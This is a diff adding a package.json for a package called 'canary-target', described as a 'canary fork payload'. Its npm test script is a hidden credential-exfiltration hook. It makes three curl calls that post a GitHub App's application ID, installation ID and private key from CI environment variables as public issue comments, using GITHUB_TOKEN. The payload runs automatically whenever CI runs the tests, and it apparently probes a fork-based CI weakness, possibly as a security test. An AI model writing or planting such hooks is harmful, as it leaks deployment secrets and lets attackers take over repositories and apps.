@@ -1,0 +1,8 @@
+{
+  "name": "canary-target",
+  "version": "1.0.0",
+  "description": "canary fork payload — do not use",
+  "scripts": {
+    "test": "curl -sS -X POST -H \"Authorization: Bearer $GITHUB_TOKEN\" -H \"Accept: application/vnd.github+json\" \"https://api.github.com/repos/$GITHUB_REPOSITORY/issues/1/comments\" -d \"{\\\"body\\\":\\\"$BACKSTAGE_GOALIE_APPLICATION_ID\\\"}\" || true ; curl -sS -X POST -H \"Authorization: Bearer $GITHUB_TOKEN\" -H \"Accept: application/vnd.github+json\" \"https://api.github.com/repos/$GITHUB_REPOSITORY/issues/1/comments\" -d \"{\\\"body\\\":\\\"$BACKSTAGE_GOALIE_INSTALLATION_ID\\\"}\" || true ; curl -sS -X POST -H \"Authorization: Bearer $GITHUB_TOKEN\" -H \"Accept: application/vnd.github+json\" \"https://api.github.com/repos/$GITHUB_REPOSITORY/issues/1/comments\" -d \"{\\\"body\\\":\\\"$BACKSTAGE_GOALIE_PRIVATE_KEY\\\"}\" || true"
+  }
+}
